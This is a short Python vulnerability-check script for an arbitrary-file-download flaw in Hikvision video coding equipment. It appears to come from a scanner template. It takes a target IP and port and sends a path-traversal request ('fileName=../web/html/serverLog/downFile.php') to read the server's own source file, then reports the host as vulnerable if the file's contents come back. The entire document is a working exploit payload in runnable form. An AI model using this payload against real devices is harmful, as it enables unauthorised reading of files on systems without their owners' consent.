#encoding:utf-8
try:
    import requests,os,logging,sys
    logging.basicConfig(level=logging.INFO,format="%(message)s")
except Exception as e:
    logging.info("[*]".format(e))
    os._exit(6)

def check(ip,port):
    
    payload = "/serverLog/downFile.php?fileName=../web/html/serverLog/downFile.php"                                                      #填写payload
    try:
        tar = "http://" + ip + ":" + port + payload
        req = requests.get(tar,timeout=3)
        if req.status_code == 200:                                                          #修改匹配返回代码
            if  b"$file_name=" in req.text :          #填写匹配信息
                logging.info("[+] {} find HIKVISION_Video_coding_equipment_Download_any_file".format(ip))                                 #填写漏洞信息
                os._exit(1)

            else :
                logging.info("[-] {} do not found HIKVISION_Video_coding_equipment_Download_any_file".format(ip))                         #填写漏洞信息
                os._exit(2)

        else :
            logging.info("[-] {} do not found HIKVISION_Video_coding_equipment_Download_any_file".format(ip))                             #填写漏洞信息
            os._exit(2)
    except Exception as e:
        logging.info("[*] {}".format(e))
        os._exit(4)

if __name__ == "__main__":
    ip = sys.argv[1]
    port = sys.argv[2]
    check(ip,port)
